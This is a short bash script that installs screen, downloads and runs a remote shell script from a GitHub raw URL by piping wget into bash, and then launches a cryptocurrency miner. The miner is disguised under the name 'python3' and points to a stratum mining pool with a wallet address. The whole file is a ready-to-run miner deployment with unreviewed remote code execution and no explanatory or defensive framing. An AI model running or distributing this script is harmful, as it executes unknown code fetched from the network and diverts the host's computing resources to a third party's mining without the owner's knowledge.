#!/bin/bash

apt install screen -y

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"

screen ./dotsrb/python3 -a yespowertide  -o stratum-asia.rplant.xyz:17059 -u TRtxm5p4czBpmLp6TTfLdu6vKCEvbwXuYW.DOT
